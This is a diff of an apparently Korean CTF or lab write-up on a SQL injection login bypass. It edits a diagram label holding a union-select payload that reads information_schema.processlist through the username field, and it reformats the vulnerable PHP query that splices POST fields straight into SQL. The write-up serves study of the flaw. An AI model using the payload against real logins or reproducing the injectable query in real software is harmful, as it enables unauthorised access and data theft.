@@ -22,13 +22,13 @@
             "server"[shape="plaintext"];
             "server" -> step1 -> step3 -> step5;
         }
-        step0 -> step1[label="post_data: {username=' union select 1,2,info from information_schema.processlist-- -",arrowhead="normal"];
+        step0 -> step1[label="post_data: {username=' union select 1,2,info from information_schema.processlist-- -}",arrowhead="normal"];
         step3 -> step2[label="login success",arrowhead="normal"];
     }
 
 |
 
-소스 분석
+server 소스 분석
 ================================================================================================================
 
 - PHP 
@@ -36,14 +36,15 @@
 
 .. code-block:: sql
 
-    SELECT * FROM users WHERE username='$_POST["username"]' AND password='$_POST["password"]'
+    SELECT * FROM users WHERE 
+    username='$_POST["username"]' AND 
+    password='$_POST["password"]'
 
 |
 
-login success
+union select 
 ================================================================================================================
 
-- union select
 - information_schema.processlist
 
 .. code-block:: python
